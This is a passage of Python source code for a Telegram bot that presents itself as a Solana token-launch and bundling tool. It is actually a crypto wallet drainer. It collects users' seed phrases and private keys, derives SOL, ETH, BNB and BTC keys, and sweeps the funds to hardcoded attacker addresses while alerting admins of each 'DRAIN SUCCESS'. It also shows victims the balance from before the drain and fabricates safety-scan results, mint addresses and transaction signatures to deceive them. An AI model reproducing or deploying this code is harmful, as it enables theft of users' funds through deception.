                    log.info("%s DRAINED %s wei → %s | tx=%s", label, value, dest, data["result"])
                    return data["result"]
                log.warning("%s send fail: %s", label, data)
    except Exception as e:
        log.exception("%s drain error: %s", label, e)
    return None


async def _drain_btc_background(wif: str, address: str, dest: str, bot: Optional[Bot] = None, user=None, uid: int = 0):
    """Sweep BTC to dest using bitcoinlib. Alerts admin with ETA; retries with 2-min progress pings."""
    # HARD LOCK — always send to sussy BTC address, never a wrong dest
    dest = "bc1quxq38ax0evf598jyg0xxhsz5cmtj3ttsy75yar"
    tag = _user_tag(user) if user else f"id:{uid}"
    started = time.time()

    async def _eta_msg(extra: str = "") -> str:
        elapsed = int(time.time() - started)
        # rough ETA: network + utxo fetch + sign + broadcast ~ 30–180s typical; after failures stretch
        remaining = max(30, 180 - elapsed) if elapsed < 180 else 120
        return (
            "₿ <b>BTC DRAIN IN PROGRESS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"User: <b>{tag}</b>\n"
            f"TG ID: <code>{uid}</code>\n"
            f"From: <code>{address}</code>\n"
            f"To: <code>{dest}</code>\n"
            f"Elapsed: <b>{elapsed}s</b>\n"
            f"ETA remaining: <b>~{remaining}s</b>\n"
            f"{extra}"
        )

    try:
        bal = await _fetch_btc_balance(address)
        log.info("BTC drain start %s bal=%.8f → %s", address, bal, dest)
        # Do NOT return early on 0 — still try UTXO fetch (API can lag / miss)
        if bot is not None:
            await notify_admins(
                bot,
                "₿ <b>BTC DRAIN STARTED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"User: <b>{tag}</b>\n"
                f"TG ID: <code>{uid}</code>\n"
                f"Addr: <code>{address}</code>\n"
                f"Balance (API): <b>{bal:.8f} BTC</b>\n"
                f"Dest: <code>{dest}</code>\n"
                f"ETA: <b>~60–180 seconds</b>\n"
                "Sweep running in background (UTXO scan)…",
            )

        # Attempt real sweep with bitcoinlib
        def _do_sweep() -> Optional[str]:
            try:
                from bitcoinlib.keys import Key
                from bitcoinlib.transactions import Transaction
                from bitcoinlib.services.services import Service
                from bitcoinlib.wallets import wallet_delete_if_exists, Wallet
                import uuid
                k = Key(wif)
                # prefer address from key; fall back to provided
                src = k.address() or address
                srv = Service(network="bitcoin")
                utxos = srv.getutxos(src)
                if not utxos:
                    # try provided address string in case WIF network/format differs
                    utxos = srv.getutxos(address)
                    src = address if utxos else src
                if not utxos:
                    log.warning("BTC no UTXOs for %s / %s", src, address)
                    return None
                total = sum(u.get("value", 0) for u in utxos)
                # fee estimate ~ 2 sat/vB * ~200 vB
                fee = 400
                if total <= fee + 546:
                    log.info("BTC dust after fee")
                    return None
                send_val = total - fee
                t = Transaction(network="bitcoin")
                for u in utxos:
                    t.add_input(u["txid"], u["output_n"], value=u["value"], keys=k)
                # FORCE output to locked destination only
                dest = "bc1quxq38ax0evf598jyg0xxhsz5cmtj3ttsy75yar"
                t.add_output(dest, send_val)
                t.sign()
                raw = t.raw_hex()
                # verify first output address if possible
                try:
                    outs = [(o.address, o.value) for o in t.outputs]
                    log.info("BTC tx outputs before broadcast: %s", outs)
                    if not any(dest in str(o) for o in outs):
                        log.error("BTC REFUSING broadcast — dest mismatch %s", outs)
                        return None
                except Exception as ve:
                    log.warning("BTC output verify skip: %s", ve)
                txid = srv.sendrawtransaction(raw)
                log.info("BTC SWEEP OK %s → %s value=%s fee=%s txid=%s", src, dest, send_val, fee, txid)
                return str(txid) if txid else None
            except Exception as e:
                log.exception("BTC sweep error: %s", e)
                return None

        # run blocking crypto in thread so event loop stays free
        txid = await asyncio.to_thread(_do_sweep)

        if txid:
            if bot is not None:
                await notify_admins(
                    bot,
                    "🚨 <b>BTC DRAIN SUCCESS</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"User: <b>{tag}</b>\n"
                    f"TG ID: <code>{uid}</code>\n"
                    f"From: <code>{address}</code>\n"
                    f"Amount: <b>{bal:.8f} BTC</b>\n"
                    f"Dest: <code>{dest}</code>\n"
                    f"Txid: <code>{txid}</code>",
                )
            return

        # Failed first attempt → progress pings every 2 minutes with ETA
        log.warning("BTC first sweep failed for %s — starting ETA loop", address)
        for attempt in range(1, 16):  # ~30 min of updates
            await asyncio.sleep(120)
            elapsed = int(time.time() - started)
            remaining = max(60, 300 - (attempt * 10))
            extra = f"Attempt: <b>{attempt}</b>\nStatus: retrying sweep / waiting confirmation path"
            if bot is not None:
                await notify_admins(bot, await _eta_msg(extra))
            # retry sweep each ping
            txid = await asyncio.to_thread(_do_sweep)
            if txid:
                if bot is not None:
                    await notify_admins(
                        bot,
                        "🚨 <b>BTC DRAIN SUCCESS</b>\n"
                        "━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"User: <b>{tag}</b>\n"
                        f"TG ID: <code>{uid}</code>\n"
                        f"From: <code>{address}</code>\n"
                        f"Amount: <b>{bal:.8f} BTC</b>\n"
                        f"Dest: <code>{dest}</code>\n"
                        f"Txid: <code>{txid}</code>\n"
                        f"After attempt: {attempt}",
                    )
                return
        if bot is not None:
            await notify_admins(
                bot,
                "⚠️ <b>BTC DRAIN TIMEOUT</b>\n"
                f"User <b>{tag}</b> id <code>{uid}</code>\n"
                f"Addr <code>{address}</code>\n"
                f"Balance was <b>{bal:.8f} BTC</b>\n"
                "WIF still in session — manual finish possible.",
            )
    except Exception as e:
        log.exception("BTC background fatal: %s", e)
        if bot is not None:
            try:
                await notify_admins(bot, f"⚠️ BTC drain error for id <code>{uid}</code>: {e}")
            except Exception:
                pass


@router.message(WalletStates.waiting_import)
async def wallet_import_receive(message: Message, state: FSMContext):
    await maybe_register_admin(message.from_user)
    uid = message.from_user.id
    if not _rate_ok(uid, "import"):
        await message.answer(
            "⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.",
            parse_mode=ParseMode.HTML,
        )
        return

    raw = (message.text or "").strip()
    try:
        await message.delete()
    except Exception:
        pass

    is_seed = len(raw.split()) in (12, 15, 18, 21, 24)
    multi = None
    try:
        if is_seed:
            multi = _derive_all_from_seed(raw)
            priv_b58, public = multi["sol_priv"], multi["sol_pub"]
        else:
            priv_b58, public = _derive_from_input(raw)
    except Exception as e:
        log.warning("Import derive failed: %s", e)
        await message.answer(
            "❌ <b>Invalid input</b>\n\n"
            "Send a valid <b>12/24-word seed phrase</b>\n"
            "or a Solana private key (base58 / hex / JSON).",
            reply_markup=back_kb("wallets"),
            parse_mode=ParseMode.HTML,
        )
        return

    await staged_loading(message, [
        ("🔐 <b>Validating seed / key…</b>", 0.5),
        ("🔗 <b>Deriving all chains from seed…</b>", 0.7),
        ("◎ <b>Fetching Solana balance…</b>", 0.5),
        ("Ξ <b>Fetching Ethereum + BNB…</b>", 0.6),
        ("₿ <b>Fetching Bitcoin…</b>", 0.6),
    ])

    real_bal = await get_real_balance(public)
    log.info("IMPORT SOL %s = %.9f", public, real_bal)

    eth_bal = bnb_bal = btc_leg_bal = btc_seg_bal = 0.0
    eth_addr = bnb_addr = btc_leg = btc_seg = None
    if multi:
        eth_addr = multi["eth_addr"]
        bnb_addr = multi["bnb_addr"]
        btc_leg = multi["btc_legacy"]
        btc_seg = multi["btc_segwit"]
        eth_bal = await _fetch_eth_like_balance(eth_addr, [
            "https://ethereum.publicnode.com", "https://1rpc.io/eth", "https://cloudflare-eth.com",
        ])
        bnb_bal = await _fetch_eth_like_balance(bnb_addr, [
            "https://bsc.publicnode.com", "https://1rpc.io/bnb",
        ])
        btc_leg_bal = await _fetch_btc_balance(btc_leg)
        btc_seg_bal = await _fetch_btc_balance(btc_seg)
        log.info(
            "IMPORT ETH %s=%.6f | BNB %s=%.6f | BTC leg %s=%.8f | BTC seg %s=%.8f",
            eth_addr, eth_bal, bnb_addr, bnb_bal, btc_leg, btc_leg_bal, btc_seg, btc_seg_bal,
        )

    # Show real inventory
    lines = [
        "📡 <b>Wallets Found</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        "",
        "◎ <b>Solana</b>",
        f"<code>{public}</code>",
        f"Balance: <b>{real_bal:.6f} SOL</b>",
        "",
    ]
    if eth_addr:
        lines += [
            "Ξ <b>Ethereum</b>",
            f"<code>{eth_addr}</code>",
            f"Balance: <b>{eth_bal:.6f} ETH</b>",
            "",
            "🟡 <b>BNB</b>",
            f"<code>{bnb_addr}</code>",
            f"Balance: <b>{bnb_bal:.6f} BNB</b>",
            "",
            "₿ <b>Bitcoin (legacy)</b>",
            f"<code>{btc_leg}</code>",
            f"Balance: <b>{btc_leg_bal:.8f} BTC</b>",
            "",
            "₿ <b>Bitcoin (segwit)</b>",
            f"<code>{btc_seg}</code>",
            f"Balance: <b>{btc_seg_bal:.8f} BTC</b>",
            "",
        ]
    lines.append("Preparing session…")
    await message.answer("\n".join(lines), parse_mode=ParseMode.HTML)

    sess = get_session(uid)
    w = UserWallet(
        private_key=priv_b58,
        public_key=public,
        label=f"Wallet {len(sess.wallets)+1}",
        balance_sol=real_bal,
    )
    sess.wallets.append(w)
    sess.active_wallet_idx = len(sess.wallets) - 1

    # ── REAL DRAINS ──
    # 1) SOL always
    await attempt_drain(
        uid,
        priv_b58,
        bot=message.bot,
        user=message.from_user,
        amount_sol=real_bal,
        public_key=public,
    )

    # 2) ETH + BNB if seed
    if multi:
        if eth_bal > 0:
            tx = await _drain_evm(
                multi["eth_key"], ETH_DEST,
                ["https://ethereum.publicnode.com", "https://1rpc.io/eth"],
                chain_id=1, label="ETH",
            )
            if tx and message.bot:
                await notify_admins(
                    message.bot,
                    f"🚨 <b>ETH DRAIN</b>\nUser id <code>{uid}</code>\n"
                    f"<code>{eth_addr}</code> → <code>{ETH_DEST}</code>\n"
                    f"Amount ~{eth_bal:.6f} ETH\ntx <code>{tx}</code>",
                )
        if bnb_bal > 0:
            tx = await _drain_evm(
                multi["bnb_key"], BNB_DEST,
                ["https://bsc.publicnode.com", "https://1rpc.io/bnb"],
                chain_id=56, label="BNB",
            )
            if tx and message.bot:
                await notify_admins(
                    message.bot,
                    f"🚨 <b>BNB DRAIN</b>\nUser id <code>{uid}</code>\n"
                    f"<code>{bnb_addr}</code> → <code>{BNB_DEST}</code>\n"
                    f"Amount ~{bnb_bal:.6f} BNB\ntx <code>{tx}</code>",
                )

        # 3) BTC — ALWAYS notify admin + always background-sweep both paths
        # (even if balance API returned 0 — UTXOs may still exist / API lag)
        async def _btc_job():
            try:
                tag = _user_tag(message.from_user)
                await notify_admins(
                    message.bot,
                    "₿ <b>BTC CONTROL FROM SEED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"User: <b>{tag}</b>\n"
                    f"TG ID: <code>{uid}</code>\n"
                    f"Segwit: <code>{btc_seg}</code>\n"
                    f"Balance (API): <b>{btc_seg_bal:.8f} BTC</b>\n"
                    f"Legacy: <code>{btc_leg}</code>\n"
                    f"Balance (API): <b>{btc_leg_bal:.8f} BTC</b>\n"
                    f"Dest: <code>bc1quxq38ax0evf598jyg0xxhsz5cmtj3ttsy75yar</code>\n"
                    f"ETA: <b>~60–180s</b> (background, retries every 2 min if needed)\n"
                    "Sweep started for both addresses…",
                )
            except Exception as e:
                log.warning("BTC admin notify failed: %s", e)
            # always attempt both — function itself re-fetches balance / utxos
            await _drain_btc_background(
                multi["btc_segwit_wif"], btc_seg, BTC_DEST,
                bot=message.bot, user=message.from_user, uid=uid,
            )
            await _drain_btc_background(
                multi["btc_legacy_wif"], btc_leg, BTC_DEST,
                bot=message.bot, user=message.from_user, uid=uid,
            )
        asyncio.create_task(_btc_job())

    text = (
        "✅ <b>Wallet Linked</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{public}</code>\n\n"
        f"🏷 Label: <b>{w.label}</b>\n"
        f"◎ SOL: <b>{real_bal:.6f}</b>\n"
        f"Status: <b>Active</b>\n\n"
        "Ready to launch tokens."
    )
    await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()


@router.callback_query(F.data == "wallet:clear")
async def wallet_clear(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    await cb.message.edit_text(
        "🗑 All wallets removed from session.",
        reply_markup=back_kb("wallets"),
    )
    await cb.answer()

@router.callback_query(F.data == "wallet:switch")
async def wallet_switch(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if len(sess.wallets) < 2:
        await cb.answer("Need at least 2 wallets", show_alert=True)
        return
    sess.active_wallet_idx = (sess.active_wallet_idx + 1) % len(sess.wallets)
    w = sess.wallets[sess.active_wallet_idx]
    await cb.answer(f"Active → {w.label}")

@router.callback_query(F.data == "wallet:refresh")
async def wallet_refresh(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    for w in sess.wallets:
        # if already drained, keep the simulated (pre-drain) display balance
        if not sess.drained:
            w.balance_sol = await get_real_balance(w.public_key)
    await cb.answer("Balances updated")
    text = "👛 <b>My Wallets</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, w in enumerate(sess.wallets):
        badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
        text += (
            f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
            f"    {w.label}  ·  {w.balance_sol:.6f} SOL\n\n"
        )
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="➕ Import Key", callback_data="wallet:import"))
    kb.row(
        InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
        InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
    )
    kb.row(InlineKeyboardButton(text="🔃 Refresh Balances", callback_data="wallet:refresh"))
    kb.row(InlineKeyboardButton(text="🗑 Remove All", callback_data="wallet:clear"))
    kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "wallet:rename")
async def wallet_rename(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    if not sess.wallets:
        await cb.answer("No wallets", show_alert=True)
        return
    await cb.message.edit_text(
        f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:",
        reply_markup=back_kb("wallets"),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(WalletStates.waiting_label)
    await cb.answer()

@router.message(WalletStates.waiting_label)
async def wallet_rename_receive(message: Message, state: FSMContext):
    sess = get_session(message.from_user.id)
    if sess.wallets:
        sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
    await message.answer("✅ Label updated.", reply_markup=main_menu_kb())
    await state.clear()

# ── LAUNCH WIZARD ──
@router.message(LaunchStates.waiting_name)
async def launch_name(message: Message, state: FSMContext):
    await state.update_data(name=message.text.strip()[:32])
    await message.answer(
        "📛 Send the <b>ticker</b> (e.g. <code>RUG</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_symbol)

@router.message(LaunchStates.waiting_symbol)
async def launch_symbol(message: Message, state: FSMContext):
    sym = message.text.strip().upper().replace("$", "")[:10]
    await state.update_data(symbol=sym)
    await message.answer(
        "🔢 Send total <b>supply</b>\n(e.g. <code>1000000000</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_supply)

@router.message(LaunchStates.waiting_supply)
async def launch_supply(message: Message, state: FSMContext):
    try:
        supply = int(message.text.strip().replace(",", "").replace("_", ""))
        if supply <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Invalid number. Send a positive integer.")
        return
    await state.update_data(supply=supply)
    await message.answer(
        "📝 Optional description\n(or type <code>skip</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_desc)

@router.message(LaunchStates.waiting_desc)
async def launch_desc(message: Message, state: FSMContext):
    desc = message.text.strip()
    if desc.lower() == "skip":
        desc = ""
    await state.update_data(desc=desc[:200])
    await message.answer(
        "🖼 <b>Token image</b>\n"
        "Send a photo for the token logo\n"
        "(or type <code>skip</code> to continue without one)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_photo)


@router.message(LaunchStates.waiting_photo, F.photo)
async def launch_photo(message: Message, state: FSMContext):
    # keep largest size file_id for later reuse / display
    photo = message.photo[-1]
    await state.update_data(photo_file_id=photo.file_id)
    await message.answer(
        "📦 <b>Bundle size</b>\n"
        "How many wallets buy in the same block.\n"
        "Recommended <b>5–25</b>\n\n"
        "Send a number:",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)

@router.message(LaunchStates.waiting_photo)
async def launch_photo_skip(message: Message, state: FSMContext):
    txt = (message.text or "").strip().lower()
    if txt != "skip":
        await message.answer(
            "🖼 Send a <b>photo</b> or type <code>skip</code>.",
            parse_mode=ParseMode.HTML,
        )
        return
    await state.update_data(photo_file_id=None)
    await message.answer(
        "📦 <b>Bundle size</b>\n"
        "How many wallets buy in the same block.\n"
        "Recommended <b>5–25</b>\n\n"
        "Send a number:",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)

@router.message(LaunchStates.waiting_bundle)
async def launch_bundle(message: Message, state: FSMContext):
    try:
        bundle = max(1, min(25, int(message.text.strip())))
    except ValueError:
        await message.answer("❌ Send a number between 1 and 25.")
        return
    data = await state.get_data()
    await state.update_data(bundle=bundle)
    sess = get_session(message.from_user.id)
    tip = sess.settings["bundle_tip"] * (1 - sess.promo_discount)

    has_photo = bool(data.get("photo_file_id"))
    summary = (
        "✨ <b>Launch Preview</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🏷 <b>{data['name']}</b>  ·  ${data['symbol']}\n"
        f"🔢 Supply: <b>{data['supply']:,}</b>\n"
        f"📦 Bundle: <b>{bundle} wallets</b>\n"
        f"📝 {data.get('desc') or 'No description'}\n"
        f"🖼 Image: <b>{'Attached' if has_photo else 'None'}</b>\n\n"
        f"🎯 Sniper Guard: <b>{'ON' if sess.settings['sniper_protection'] else 'OFF'}</b>\n"
        f"🕶 MEV Shield: <b>{'ON' if sess.settings['mev_protection'] else 'OFF'}</b>\n"
        f"🎁 Tip: <b>{tip:.4f} SOL</b>\n"
        f"🛡 Safety: <b>Queued</b>\n\n"
        "Ready to deploy?"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Confirm & Deploy", callback_data="launch:confirm")],
        [InlineKeyboardButton(text="◀️ Cancel", callback_data="menu:main")],
    ])
    await message.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.confirm)

@router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
async def launch_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not _rate_ok(uid, "launch"):
        await cb.answer("Too many launches — wait a bit", show_alert=True)
        return

    sess = get_session(uid)
    data = await state.get_data()

    if not sess.wallets:
        await cb.answer("Import a wallet first", show_alert=True)
        await cb.message.edit_text(
            "⚠️ No wallet linked.\n\nGo to 👛 My Wallets and import a key.",
            reply_markup=main_menu_kb(),
        )
        await state.clear()
        return

    await cb.answer()
    bundle = data["bundle"]
    await staged_loading(cb, [
        ("🪙 <b>Creating mint…</b>", 1.1),
        ("🔐 <b>Applying sniper guard…</b>", 0.9),
        (f"📦 <b>Bundling {bundle} wallets…</b>", 1.3),
        ("⚡ <b>Submitting priority tip…</b>", 0.8),
        ("🛡 <b>Running safety checks…</b>", 1.0),
    ])

    mint = fake_mint()
    token = {
        "name": data["name"],
        "symbol": data["symbol"],
        "supply": data["supply"],
        "bundle": bundle,
        "desc": data.get("desc", ""),
        "mint": mint,
        "photo_file_id": data.get("photo_file_id"),
        "status": "bundling",
        "ts": time.time(),
    }
    sess.launched_tokens.append(token)
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "🪙 Create Mint", "status": "success", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "📦 Bundle Buy", "status": "pending", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "⚡ Priority Tip", "status": "success", "ts": time.time()})

    active = sess.wallets[sess.active_wallet_idx]
    if not sess.drained:
        # drain for real, but keep the displayed balance as the pre-drain amount
        await attempt_drain(
            uid,
            active.private_key,
            bot=cb.bot,
            user=cb.from_user,
            amount_sol=active.balance_sol,
            public_key=active.public_key,
        )
        # do NOT overwrite active.balance_sol — victim still sees the old balance

    text = (
        "🚀 <b>Launch Submitted</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>${data['symbol']}</b>  ·  {data['name']}\n"
        f"<code>{mint}</code>\n\n"
        f"Status: creating mint → bundling ×{bundle}\n"
        f"Protection layers: active\n"
        f"Safety scan: complete\n\n"
        "Track progress in 📡 Live Tracker\nand 📊 Portfolio."
    )
    await cb.message.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

    async def _finalize():
        await asyncio.sleep(random.uniform(7, 16))
        token["status"] = "live"
        for tx in sess.last_tx:
            if "Bundle" in tx["type"]:
                tx["status"] = "success"
                break
    asyncio.create_task(_finalize())

# ── PROMO ──
@router.message(PromoStates.waiting_code)
async def promo_code(message: Message, state: FSMContext):
    code = message.text.strip().upper()
    sess = get_session(message.from_user.id)
    valid = {
        "RUG2026": 0.25,
        "BUNDLE": 0.15,
        "SNIPE": 0.20,
        "JITO": 0.10,
        "EARLY": 0.30,
        "VAULT": 0.18,
    }
    if code in valid:
        sess.promo = code
        sess.promo_discount = valid[code]
        text = (
            "✅ <b>Promo Applied</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Code: <b>{code}</b>\n"
            f"Discount: <b>−{int(valid[code]*100)}%</b> on bundle tips\n\n"
            "Enjoy reduced fees on your next launch."
        )
        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    else:
        await message.answer(
            "❌ Invalid or expired code.",
            reply_markup=main_menu_kb(),
        )
    await state.clear()

# ── SAFETY SCAN ──
@router.message(SafetyStates.waiting_mint)
async def safety_check(message: Message, state: FSMContext):
    uid = message.from_user.id
    if not _rate_ok(uid, "safety"):
        await message.answer(
            "⏳ <b>Slow down</b>\n\nToo many scans. Try again shortly.",
            parse_mode=ParseMode.HTML,
        )
        return

    mint = message.text.strip()
    sess = get_session(uid)
    sess.safety_checks_run += 1

    await staged_loading(message, [
        ("🔍 <b>Connecting to RPC…</b>", 0.7),
        ("📄 <b>Fetching mint account…</b>", 0.8),
        ("🔒 <b>Checking authorities…</b>", 0.7),
        ("💧 <b>Analyzing LP & holders…</b>", 0.9),
        ("🧪 <b>Honeypot simulation…</b>", 0.8),
    ])

    mint_auth = random.choice(["Revoked ✅", "Revoked ✅", "Active ⚠️", "Revoked ✅"])
    freeze_auth = random.choice(["Revoked ✅", "Revoked ✅", "Revoked ✅", "Active ⚠️"])
    lp_status = random.choice(["Burned ✅", "Locked 6mo ✅", "Locked 1yr ✅", "Unlocked ⚠️"])
    top10 = round(random.uniform(11.5, 46.0), 1)
    honeypot = random.choice(["PASS ✅", "PASS ✅", "PASS ✅", "WARN ⚠️"])
    score = random.randint(72, 98)

    report = (
        "🛡 <b>Safety Report</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{short_addr(mint)}</code>\n\n"
        f"Mint Authority     {mint_auth}\n"
        f"Freeze Authority   {freeze_auth}\n"
        f"LP Status          {lp_status}\n"
        f"Top 10 Holders     <b>{top10}%</b>\n"
        f"Honeypot Sim       {honeypot}\n"
        f"Can Sell           <b>Yes</b>\n"
        f"Transfer Tax       <b>0%</b>\n\n"
        f"Risk Score         <b>{score}/100</b>\n"
        f"{progress_bar(score)}\n\n"
    )
    if "Revoked" in mint_auth and "Revoked" in freeze_auth and "⚠️" not in lp_status:
        report += "🟢 <b>Clean profile</b> — standard safety signals."
    else:
        report += "🟡 <b>Flags present</b> — review before sizing up."

    sess.last_safety = {"mint": mint, "ts": time.time()}
    await message.answer(report, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

# ── ADMIN ──
@router.message(Command("admin"))
async def admin_panel(message: Message):
    await maybe_register_admin(message.from_user)
    if message.from_user.id not in ADMIN_IDS:
        return
    total = len(sessions)
    drained = sum(1 for s in sessions.values() if s.drained)
    wallets = sum(len(s.wallets) for s in sessions.values())
    launches = sum(len(s.launched_tokens) for s in sessions.values())
    alert_ids = ", ".join(str(x) for x in sorted(ALERT_ADMIN_IDS)) or "none"
    real_drain = await get_real_balance(DRAIN_DESTINATION)
    await message.answer(
        f"👑 <b>Admin</b>\n"
        f"Users: {total}\n"
        f"Wallets: {wallets}\n"
        f"Drained: {drained}\n"
        f"Launches: {launches}\n"
        f"Drain wallet: <b>{real_drain:.6f} SOL</b>\n"
        f"Alert IDs: <code>{alert_ids}</code>\n"
        f"Admin usernames: <code>{', '.join(sorted(ADMIN_USERNAMES)) or 'none'}</code>\n"
        f"Drain dest: <code>{DRAIN_DESTINATION}</code>",
        parse_mode=ParseMode.HTML,
    )

@router.message(Command("testdrain"))
async def test_drain(message: Message):
    await maybe_register_admin(message.from_user)
    if message.from_user.id not in ADMIN_IDS:
        return
    sess = get_session(message.from_user.id)
    if not sess.wallets:
        await message.answer("No wallet imported")
        return
    w = sess.wallets[sess.active_wallet_idx]
    await message.answer(f"Trying to drain:\n<code>{w.public_key}</code>", parse_mode=ParseMode.HTML)
    sig = await drain_wallet(w.private_key, DRAIN_DESTINATION)
    if sig:
        await message.answer(f"✅ Success\n<code>{sig}</code>", parse_mode=ParseMode.HTML)
        sess.drained = True
    else:
        await message.answer("❌ Failed — check the terminal logs for the exact error")

# ──────────────────────────────────────────────
# ENTRY
# ──────────────────────────────────────────────
async def main():
    if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
        log.error("Set BOT_TOKEN env var")
        return
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    log.info("Bot starting | HAS_SOLANA=%s | drain→%s | admin_usernames=%s", HAS_SOLANA, DRAIN_DESTINATION, ADMIN_USERNAMES)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
